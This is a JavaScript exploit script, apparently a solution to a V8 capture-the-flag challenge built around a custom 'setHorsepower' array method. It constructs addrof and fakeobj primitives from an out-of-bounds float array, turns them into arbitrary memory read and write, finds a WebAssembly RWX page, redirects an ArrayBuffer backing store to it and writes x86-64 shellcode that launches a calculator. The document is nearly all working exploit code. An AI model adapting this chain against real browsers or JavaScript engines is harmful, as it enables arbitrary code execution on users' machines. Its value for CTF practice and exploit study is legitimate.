/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}


function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}



//take care of the order 
var float_arr = [1.1,2.2,3.3];
var obj = {"A":1};
var obj_arr = [obj];


//%DebugPrint(float_arr);
float_arr.setHorsepower(200);
//%DebugPrint(obj_arr);

function Addrof(obj_addr){
    //put obj we want to leak its address in first element of obj_arr
    obj_arr[0] = obj_addr;
    //return address of obj we want in 32 bit due to pointer compression 
    return ftoi(float_arr[11]) >> 32n;   

}

function Fakeobj(addr){
    //convert addr to float
    float_arr[11] = itof(BigInt(addr)<<32n);
    //return obj_arr[0] 
    var fake = obj_arr[0];

    return fake;

}

a = {"Test": 1337}
console.log("[+] ---------stage(1)-------------");
console.log(`[+] Check addrof and fakeobj: ${a["Test"]} == ${Fakeobj(Addrof(a))["Test"]}`);
console.log("[+] Addrof(a): 0x" + Addrof(a).toString(16));
console.log("[+] Fakeobj(a):" + Fakeobj(Addrof(a)));
//%DebugPrint(implement_arr);


console.log("[+] --------------stage(2)---------")

var float_arr_map = ftoi(float_arr[3]);
console.log("[+] float_arr_map: 0x" + float_arr_map.toString(16));

crafted_arr = [itof(float_arr_map), itof((4n << 32n))] // 4 here (numb of elements) * 2 (shift left one for smi)


function arb_read(addr) {



    if (addr % 2n == 0)
        addr += 1n;


    crafted_arr[1] = itof((4n << 32n) + addr - 0x8n);
    let fake = Fakeobj(Addrof(crafted_arr) + 60n + 0x8n ); //(60) offset from arr_ptr to elment_ptr

    return ftoi(fake[0]);
  

}


function arb_write(addr,value){


    if (addr % 2n == 0)
        addr += 1n;


    crafted_arr[1] = itof((4n << 32n) + addr - 0x8n);

    let fake = Fakeobj(Addrof(crafted_arr) + 60n + 0x8n );

    fake[0] = itof(value)

}


//console.log("[+] arb_read crafted_arr: 0x" + arb_read(Addrof(float_arr)).toString(16));
//console.log("[+] float_arr_map: 0x" + float_arr_map.toString(16));
//console.log("[+] Addrof crafted_arr: 0x" + Addrof(crafted_arr).toString(16));
//console.log("[+] arb_write: 0x" + arb_write(Addrof(float_arr),Addrof(crafted_arr)));
//console.log("[+] arb_read crafted_arr: 0x" + Addrof(crafted_arr).toString(16));
//console.log("[+] arb_read float_arr: 0x" + Addrof(float_arr).toString(16));
//console.log("[+] float_arr_map: 0x" + itof(Fakeobj(Addrof(float_arr))).toString(16));
//%DebugPrint(crafted_arr);
//%DebugPrint(float_arr);


//------------------------------------------------
console.log("[+] --------------stage(3)---------")

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;

//RWX page base addr
var rwx_page_addr = arb_read(Addrof(wasm_instance)+ 0x67n);
console.log("[+] RWX Wasm page addr: 0x" + rwx_page_addr.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = Addrof(arr_buf) & 0xffffffffn;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);
let backing_store = arr_buf_addr + 0x14n ;
console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));


arb_write(backing_store, rwx_page_addr);

var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
for (let i = 0; i < shellcode.length; i++) { 
    dataview.setUint32(i*4, shellcode[i], true); 
} 

console.log("[+] Popping calc");
pwn();

